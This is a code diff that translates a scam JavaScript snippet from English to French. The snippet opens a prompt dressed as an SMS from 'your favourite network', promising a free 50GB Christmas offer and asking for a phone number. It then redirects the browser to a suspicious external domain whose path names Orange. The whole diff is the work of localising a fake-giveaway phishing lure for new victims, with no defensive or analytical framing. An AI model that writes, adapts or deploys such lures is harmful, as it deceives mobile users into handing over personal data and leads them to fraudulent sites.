@@ -1,8 +1,8 @@
-var password = 'GET 50GB'
+var password = 'OBTENIR 50GB'
 password = prompt(
-  'SMS: Congratulations! You are eligible to receive Christmas offer from your favourite network. Please press OK to Enter your Phone Number.',
-  'GET 50GB'
+  'SMS: Félicitations ! Vous êtes éligible à l’offre de Noël de votre opérateur préféré. Veuillez appuyer sur OK pour saisir votre numéro de téléphone..',
+  'OBTENIR 50GB'
 );
-if (password != 'GET 50GB') {
+if (password != 'OBTENIR 50GB') {
   location.href = 'https://www.bhufrizx.online/orange50gb';
 }
